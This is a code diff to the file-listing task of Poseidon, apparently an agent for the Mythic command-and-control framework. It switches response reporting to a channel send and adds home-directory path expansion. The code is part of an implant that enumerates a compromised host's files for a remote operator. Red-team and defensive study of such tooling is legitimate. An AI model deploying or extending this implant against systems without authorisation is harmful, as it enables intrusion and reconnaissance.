@@ -9,19 +9,15 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
-	"sync"
 	"syscall"
 
 	// 3rd Party
 	"github.com/djherbis/atime"
 
 	// Poseidon
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
-
-var mu sync.Mutex
-
 
 type FilePermission struct {
 	UID         int    `json:"uid"`
@@ -60,16 +56,18 @@ func Run(task structs.Task) {
 	args := structs.FileBrowserArguments{}
 	json.Unmarshal([]byte(task.Params), &args)
 	var e structs.FileBrowser
-	abspath, _ := filepath.Abs(args.Path)
+	fixedPath := args.Path
+	if strings.HasPrefix(fixedPath, "~/") {
+		dirname, _ := os.UserHomeDir()
+		fixedPath = filepath.Join(dirname, fixedPath[2:])
+	}
+	abspath, _ := filepath.Abs(fixedPath)
 	dirInfo, err := os.Stat(abspath)
 	if err != nil {
 		msg.UserOutput = err.Error()
 		msg.Completed = true
 		msg.Status = "error"
-		resp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, resp)
-		mu.Unlock()
+		task.Job.SendResponses <- msg
 		return
 	}
 	e.IsFile = !dirInfo.IsDir()
@@ -96,11 +94,8 @@ func Run(task structs.Task) {
 			msg.Completed = true
 			msg.Status = "error"
 			e.Success = false
-			msg.FileBrowser = e
-			resp, _ := json.Marshal(msg)
-			mu.Lock()
-			profiles.TaskResponses = append(profiles.TaskResponses, resp)
-			mu.Unlock()
+			msg.FileBrowser = &e
+			task.Job.SendResponses <- msg
 			return
 		}
 
@@ -120,17 +115,14 @@ func Run(task structs.Task) {
 			}
 		}
 		e.Files = fileEntries
-	}else{
-	    fileEntries := make([]structs.FileData, 0)
-	    e.Files = fileEntries
+	} else {
+		fileEntries := make([]structs.FileData, 0)
+		e.Files = fileEntries
 	}
 	msg.Completed = true
-	msg.FileBrowser = e
+	msg.FileBrowser = &e
 	temp, _ := json.Marshal(msg.FileBrowser)
 	msg.UserOutput = string(temp)
-	resp, _ := json.Marshal(msg)
-	mu.Lock()
-	profiles.TaskResponses = append(profiles.TaskResponses, resp)
-	mu.Unlock()
+	task.Job.SendResponses <- msg
 	return
 }
